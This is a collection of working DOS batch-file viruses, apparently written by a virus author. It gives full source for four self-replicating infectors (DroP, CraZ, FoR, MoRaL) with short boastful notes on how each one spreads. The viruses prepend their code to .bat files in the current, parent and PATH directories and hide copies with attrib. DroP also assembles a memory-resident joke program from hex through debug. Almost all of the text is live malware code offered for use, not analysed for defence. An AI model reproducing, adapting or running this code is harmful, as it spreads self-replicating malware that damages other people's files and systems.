@echo off%_DroP%
if '%1=='DroP goto DroP_%2
mem /c|find /i "DroP">nul
if not errorlevel 1 goto DroP_r9
echo n $DroP$.com>DroP.t
echo e 0100  EB 3F 90>>DroP.t
echo e 012A  1A 90 00 00 00 00>>DroP.t
echo e 0130  00 00 00 00 00 00 00 00 00 B8 40 00 FF 00 00 00>>DroP.t
echo e 0140  00 B0 08 BA 2C 01 E8 3F 01 B0 08 BA 86 01 E8 50>>DroP.t
echo e 0150  01 B4 2C CD 21 89 16 BE 02 C6 06 3E 01 FF B4 0F>>DroP.t
echo e 0160  CD 10 3C 06 74 0D 3C 07 74 09 C7 06 38 01 00 B8>>DroP.t
echo e 0170  EB 07 90 C7 06 38 01 00 B0 BA C0 02 B1 04 D3 EA>>DroP.t
echo e 0180  42 B4 31 CD 21 90 9C 50 B4 02 CD 16 24 40 74 1B>>DroP.t
echo e 0190  2E 80 3E 3E 01 00 74 08 2E FE 0E 3E 01 EB 0C 90>>DroP.t
echo e 01A0  2E 80 3E 3D 01 00 75 03 EB 08 90 58 9D 2E FF 2E>>DroP.t
echo e 01B0  2C 01 9C 2E FF 1E 2C 01 06 1E 52 51 57 56 0E 1F>>DroP.t
echo e 01C0  A1 38 01 8E C0 2E 80 3E 3F 01 00 74 0C 8B 3E 30>>DroP.t
echo e 01D0  01 8B 36 32 01 FB EB 5A 90 C6 06 3D 01 FF FB C6>>DroP.t
echo e 01E0  06 40 01 64 80 3E 40 01 00 75 03 E9 8B 00 FE 0E>>DroP.t
echo e 01F0  40 01 E8 B7 00 25 FE 0F 8B F0 26 8A 04 3C 20 74>>DroP.t
echo e 0200  E3 3C 00 74 DF 81 FE A0 0F 73 D9 8B FE 81 C7 A0>>DroP.t
echo e 0210  00 81 FF A0 0F 73 44 26 8A 05 3C 20 74 04 3C 00>>DroP.t
echo e 0220  75 C2 89 3E 30 01 89 36 32 01 C6 06 3F 01 FF EB>>DroP.t
echo e 0230  48 90 C6 06 3F 01 00 26 8A 04 26 88 05 26 C6 04>>DroP.t
echo e 0240  20 8B F7 81 C7 A0 00 81 FF A0 0F 73 0E 26 8A 05>>DroP.t
echo e 0250  3C 20 74 CE 3C 00 74 CA EB 05 90 26 C6 04 20 FF>>DroP.t
echo e 0260  0E 3A 01 75 0A D0 2E 3C 01 C7 06 3A 01 40 00 E8>>DroP.t
echo e 0270  3A 00 22 06 3C 01 A2 3E 01 5E 5F 59 5A 1F 07 58>>DroP.t
echo e 0280  9D 2E C6 06 3D 01 00 CF 50 06 53 55 52 B4 35 CD>>DroP.t
echo e 0290  21 8B D3 5D 89 56 00 45 45 8C 46 00 5D 5B 07 58>>DroP.t
echo e 02A0  C3 50 1E 0E 1F B4 25 CD 21 1F 58 C3 A1 BE 02 50>>DroP.t
echo e 02B0  80 E4 B4 58 7A 01 F9 D1 D0 A3 BE 02 C3 90 00 00>>DroP.t
echo rcx>>DroP.t
echo 1C0>>DroP.t
echo w>>DroP.t
echo q>>DroP.t
debug<DroP.t>nul
del DroP.t
$DroP$
del $DroP$.com
:DroP_r9
if exist c:\_DroP.bat goto DroP_go
echo DroP|find "X">nul
if not errorlevel 1 goto DroP_end
if exist %0.bat goto DroP_d1
if not exist %0 goto DroP_end
find "DroP"<%0>c:\_DroP.bat
goto DroP_d2
:DroP_d1
find "DroP"<%0.bat>c:\_DroP.bat
:DroP_d2
attrib c:\_DroP.bat +h
:DroP_go
command /c c:\_DroP DroP sh
goto DroP_end
:DroP_sh
for %%a in (*.bat ..\*.bat) do call c:\_DroP DroP in %%a
exit DroP
:DroP_in
find "DroP"<%3>nul
if not errorlevel 1 goto DroP_end
type c:\_DroP.bat>DroP.t
type %3>>DroP.t
move DroP.t %3>nul
exit DroP
:DroP_end
:: host batch here



When run, it installs a joke program resident in memory if not already
present. The virus code is inserted before the host batch. Infects one
file per run (or loop of the host) in the current and parent directory.
The payload isn't my code but the Guru said 'keep it'. When it's
resident, letters drop whenever Caps Lock is turned on.

...

This is a slightly modified one I wrote a few months back...

@goto craz
:hst_bat
:: host batch goes here

@goto CraZend
:CraZ (version E)
@echo off%_CraZ%
if '%1=='#ViR goto CraZ%2
if not '%CraZ%==' goto hst_bat
if '%0==' goto hst_bat CraZ
set CraZ=%0
set CraZc=%1 %2 %3 %4 %5 %6 %7 %8 %9
call %0 #ViR hst CraZ
set CraZs=
set CraZi=
set CraZc=%CraZ%
if exist %CraZ%.bat set CraZc=%CraZ%.bat
command /e:5000 /c %CraZ% #ViR vir %path%
set CraZ=
set CraZc=
goto CraZend
:CraZhst
%0 #ViR hs1 %0 %CraZc%
:CraZhs1
shift %_CraZ%
shift %_CraZ%
shift %_CraZ%
goto hst_bat CraZ
:CraZvir
if exist %CraZc% %CraZ% #ViR ser .. . %path%
shift %_CraZ%
if '%2==' exit CraZ
set CraZc=%2\%CraZ%.bat
if not exist %CraZc% set CraZc=%2\%CraZ%
if not exist %CraZc% set CraZc=%2%CraZ%.bat
if not exist %CraZc% set CraZc=%2%CraZ%
goto CraZvir
:CraZser
shift %_CraZ%
if '%2==' exit CraZ
for %%i in (%2\*a.bat %2*a.bat) do call %CraZ% #ViR inf %%i
goto CraZser
:CraZact
echo [CraZ] has determined this computer to be good food.
exit CraZ
:CraZinf
find "CraZ"<%3>nul
if not errorlevel 1 goto CraZS
echo @goto craz>CraZ
echo :hst_bat>>CraZ
type %3>>CraZ
echo.>>CraZ
find "CraZ"<%CraZc%>>CraZ
move CraZ %3>nul
set CraZi=%CraZi%1
if %CraZi%==11 exit
:CraZS
set CraZs=%CraZs%1
if %CraZs%==1111111111 goto CraZact
:CraZend


This batch virus does not keep a hidden file, it locates the host even
if it's in a path directory and runs directly from it. When an infected
file is run the host batch runs first to completion then the virus regains
control and attempts to infect two batch files. If 10 infected files are
encountered before infecting two files, the virus stops trying and
announces its presence to the user. This virus starts with the parent
directory, then current, then path directories. It gets around.

...

This is a small one, it only infects the current directory, but it
goes for all uninfected batch files at once...

@echo off>nul.FoR
if '%1=='InF goto FoRi
if exist c:\!for.bat goto FoRs
if not exist %0.bat goto FoRe
find "FoR"<%0.bat>c:\!for.bat
:FoRs
FoR %%a in (*.bat) do call c:\!for InF %%a
goto FoRe
:FoRi
find "FoR"<%2>nul
if not errorlevel 1 goto FoRe
type c:\!for.bat>FoR.t
type %2>>FoR.t
move FoR.t %2>nul
:FoRe
:: host follows...

...

This is a strange one. I was thinking about something...

@echo off%_MoRaL%
if '%1=='ViR goto MoRaL%2
if '%!%=='111 goto MoRaLend
if exist C:\MoRaL.bat goto MoRaLrun
if not exist %0.bat goto MoRaLend
echo MoRaL|find "x">nul
if not errorlevel 1 goto MoRaLend
find "MoRaL"<%0.bat>C:\MoRaL.bat
attrib C:\MoRaL.bat +h
:MoRaLrun
command /e:5000 /c C:\MoRaL ViR shl
set !=%!%1%_MoRaL%
goto MoRaLend
:MoRaLshl
C:\MoRaL ViR srh . .. %path%
:MoRaLsrh
shift%_MoRaL%
if '%2==' exit MoRaL
for %%a in (%2\*.bat) do call C:\MoRaL ViR inf %%a
goto MoRaLsrh
:MoRaLinf
find "MoRaL"<%3>nul
if not errorlevel 1 goto MoRaLcnt
type C:\MoRaL.bat>MoRaL.t
type %3>>MoRaL.t
move MoRaL.t %3>nul
set MoRaLi=%MoRaLi%1
if %MoRaLi%==11 exit
:MoRaLcnt
set MoRaLc=%MoRaLc%1
if not %MoRaLc%==111111111111 goto MoRaLend
echo.|date|find "Sun">nul.MoRaL
if errorlevel 1 exit MoRaL
set MoRaL=echo
%MoRaL% -----------------
%MoRaL% Moral Batch Virus
%MoRaL% -----------------
exit MoRaL
:MoRaLend
:: this would be the host
